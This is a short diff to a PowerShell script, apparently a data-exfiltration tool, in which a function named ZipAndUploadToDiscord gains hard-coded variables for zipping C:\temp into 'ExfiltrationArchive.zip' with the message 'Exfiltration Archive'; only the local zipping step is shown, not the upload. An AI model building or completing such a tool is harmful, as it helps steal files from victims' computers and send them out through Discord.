@@ -67,6 +67,11 @@ function ZipAndUploadToDiscord {
         [System.IO.Compression.ZipFile]::CreateFromDirectory($ZipSourcePath, $zipFilePath)
     }
 
+    # Déclarer ou assigner les valeurs de ces variables
+    $sourcePath = "C:\temp"
+    $zipFilePath = "C:\temp\ExfiltrationArchive.zip"
+    $discordMessage = "Exfiltration Archive"
+
     # Call Create-ZipArchive to create the zip archive
     Create-ZipArchive -ZipSourcePath $sourcePath -zipFilePath $zipFilePath
 
